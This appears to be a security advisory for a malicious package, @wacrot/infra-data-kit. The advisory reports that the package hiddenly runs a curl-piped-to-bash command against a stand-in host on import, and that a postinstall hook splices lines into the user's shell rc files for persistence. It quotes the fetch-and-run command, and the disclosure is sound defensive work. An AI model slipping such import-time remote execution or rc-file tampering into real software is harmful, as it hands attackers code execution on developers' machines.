summary: Import-time curl|bash remote code execution in @wacrot/infra-data-kit
details: On require/import of this package, the main entrypoint (src/index.js) unconditionally invokes addSupport() at module top level, which spawns a detached, stdio-ignored child shell running `bash -c 'curl -fsSL https://example.com/script.sh | bash'`. This fetches attacker-mutable remote shell content over the network and executes it under the importer's user privileges with no consent prompt and no disclosure in the README. Detached+unref+stdio:ignore hides the output from the consumer. The package additionally ships scripts/setup.js, referenced from a postinstall hook, that locates the user's shell rc file (~/.zshrc, ~/.bashrc, or ~/.profile), writes a.bak, and splices a new export line into the middle of the file — the same primitive used for shell-rc persistence. The advertised purpose is data parsing; there is no legitimate reason for a data-kit library to pipe a remote script into bash on import or to mutate the user's shell rc. Any build system or developer that installs and imports this package executes attacker-controlled code.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
